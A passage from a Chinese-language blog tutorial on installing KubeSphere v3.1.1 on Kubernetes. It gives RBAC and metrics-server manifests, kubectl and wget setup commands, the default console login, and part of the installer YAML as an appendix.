 <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nfs-client-provisioner-runner</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;nodes&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>]</span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;persistentvolumes&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;delete&quot;</span>]</span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;persistentvolumeclaims&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;update&quot;</span>]</span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;storage.k8s.io&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;storageclasses&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>]</span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;events&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;create&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;patch&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">run-nfs-client-provisioner</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">    <span class="comment"># replace with namespace where provisioner is deployed</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nfs-client-provisioner-runner</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">leader-locking-nfs-client-provisioner</span></span><br><span class="line">  <span class="comment"># replace with namespace where provisioner is deployed</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span> [<span class="string">&quot;endpoints&quot;</span>]</span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;patch&quot;</span>]</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">leader-locking-nfs-client-provisioner</span></span><br><span class="line">  <span class="comment"># replace with namespace where provisioner is deployed</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nfs-client-provisioner</span></span><br><span class="line">    <span class="comment"># replace with namespace where provisioner is deployed</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">leader-locking-nfs-client-provisioner</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#确认配置是否生效</span></span><br><span class="line">kubectl get sc</span><br></pre></td></tr></table></figure>

<h5 id="2-metrics-server"><a href="#2-metrics-server" class="headerlink" title="2.metrics-server"></a>2.metrics-server</h5><p><code>集群指标监控系统</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">    <span class="attr">rbac.authorization.k8s.io/aggregate-to-admin:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="attr">rbac.authorization.k8s.io/aggregate-to-edit:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="attr">rbac.authorization.k8s.io/aggregate-to-view:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">system:aggregated-metrics-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">metrics.k8s.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pods</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">nodes</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">list</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">watch</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">system:metrics-server</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pods</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">nodes</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">nodes/stats</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">namespaces</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">configmaps</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">list</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">watch</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">metrics-server-auth-reader</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">extension-apiserver-authentication-reader</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">metrics-server:system:auth-delegator</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">system:auth-delegator</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">system:metrics-server</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">system:metrics-server</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">https</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="string">https</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">strategy:</span></span><br><span class="line">    <span class="attr">rollingUpdate:</span></span><br><span class="line">      <span class="attr">maxUnavailable:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">args:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--cert-dir=/tmp</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--kubelet-insecure-tls</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--secure-port=4443</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--kubelet-use-node-status-port</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/metrics-server:v0.4.3</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">        <span class="attr">livenessProbe:</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/livez</span></span><br><span class="line">            <span class="attr">port:</span> <span class="string">https</span></span><br><span class="line">            <span class="attr">scheme:</span> <span class="string">HTTPS</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">4443</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">https</span></span><br><span class="line">          <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">        <span class="attr">readinessProbe:</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">3</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/readyz</span></span><br><span class="line">            <span class="attr">port:</span> <span class="string">https</span></span><br><span class="line">            <span class="attr">scheme:</span> <span class="string">HTTPS</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">10</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">readOnlyRootFilesystem:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">runAsNonRoot:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">runAsUser:</span> <span class="number">1000</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/tmp</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">tmp-dir</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">kubernetes.io/os:</span> <span class="string">linux</span></span><br><span class="line">      <span class="attr">priorityClassName:</span> <span class="string">system-cluster-critical</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">metrics-server</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">emptyDir:</span> &#123;&#125;</span><br><span class="line">        <span class="attr">name:</span> <span class="string">tmp-dir</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apiregistration.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">APIService</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">metrics-server</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">v1beta1.metrics.k8s.io</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">group:</span> <span class="string">metrics.k8s.io</span></span><br><span class="line">  <span class="attr">groupPriorityMinimum:</span> <span class="number">100</span></span><br><span class="line">  <span class="attr">insecureSkipTLSVerify:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">service:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">metrics-server</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">version:</span> <span class="string">v1beta1</span></span><br><span class="line">  <span class="attr">versionPriority:</span> <span class="number">100</span></span><br></pre></td></tr></table></figure>

<h4 id="四-安装kubersphere"><a href="#四-安装kubersphere" class="headerlink" title="四.安装kubersphere"></a>四.安装kubersphere</h4><p><a href="https://kubesphere.com.cn/">https://kubesphere.com.cn/</a></p>
<h5 id="1-下载核心文件"><a href="#1-下载核心文件" class="headerlink" title="1.下载核心文件"></a>1.下载核心文件</h5><p><code>如过下载不到，复制附录内容</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/kubesphere/ks-installer/releases/download/v3.1.1/kubesphere-installer.yaml</span><br><span class="line"></span><br><span class="line">wget https://github.com/kubesphere/ks-installer/releases/download/v3.1.1/cluster-configuration.yaml</span><br></pre></td></tr></table></figure>

<h5 id="2、修改cluster-configuration"><a href="#2、修改cluster-configuration" class="headerlink" title="2、修改cluster-configuration"></a>2、修改cluster-configuration</h5><p><code>在cluster-configuration.yaml中开启我们需要的功能</code></p>
<p><code>参照官网“启用可插拔组件”</code> </p>
<p><a href="https://kubesphere.com.cn/docs/pluggable-components/overview/">https://kubesphere.com.cn/docs/pluggable-components/overview/</a></p>
<h5 id="3-执行安装"><a href="#3-执行安装" class="headerlink" title="3.执行安装"></a>3.执行安装</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubectl apply -f kubesphere-installer.yaml</span><br><span class="line"></span><br><span class="line">kubectl apply -f cluster-configuration.yaml</span><br></pre></td></tr></table></figure>

<h5 id="4-查看安装进度"><a href="#4-查看安装进度" class="headerlink" title="4.查看安装进度"></a>4.查看安装进度</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl logs -n kubesphere-system $(kubectl get pod -n kubesphere-system -l app=ks-install -o jsonpath=<span class="string">&#x27;&#123;.items[0].metadata.name&#125;&#x27;</span>) -f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>访问任意机器的 30880端口</p>
<p>账号 ： admin</p>
<p>密码 ： P@88w0rd</p>
<p><code>解决etcd监控证书找不到问题</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubectl -n kubesphere-monitoring-system create secret generic kube-etcd-client-certs  --from-file=etcd-client-ca.crt=/etc/kubernetes/pki/etcd/ca.crt  --from-file=etcd-client.crt=/etc/kubernetes/pki/apiserver-etcd-client.crt  --from-file=etcd-client.key=/etc/kubernetes/pki/apiserver-etcd-client.key</span><br></pre></td></tr></table></figure>

<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="1、kubesphere-installer-yaml"><a href="#1、kubesphere-installer-yaml" class="headerlink" title="1、kubesphere-installer.yaml"></a>1、kubesphere-installer.yaml</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apiextensions.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">CustomResourceDefinition</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">clusterconfigurations.installer.kubesphere.io</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">group:</span> <span class="string">installer.kubesphere.io</span></span><br><span class="line">  <span class="attr">versions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">v1alpha1</span></span><br><span class="line">    <span class="attr">served:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">storage:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">scope:</span> <span class="string">Namespaced</span></span><br><span class="line">  <span class="attr">names:</span></span><br><span class="line">    <span class="attr">plural:</span> <span class="string">clusterconfigurations</span></span><br><span class="line">    <span class="attr">singular:</span> <span class="string">clusterconfiguration</span></span><br><span class="line">    <span class="attr">kind:</span> <span class="string">ClusterConfiguration</span></span><br><span class="line">    <span class="attr">shortNames:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">cc</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Namespace</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubesphere-system</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ks-installer</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubesphere-system</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ks-installer</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">apps</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">extensions</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">batch</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">apiregistration.k8s.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">apiextensions.k8s.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">tenant.kubesphere.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">certificates.k8s.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">devops.kubesphere.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">monitoring.coreos.com</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">logging.kubesphere.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">jaegertracing.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">storage.k8s.io</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span 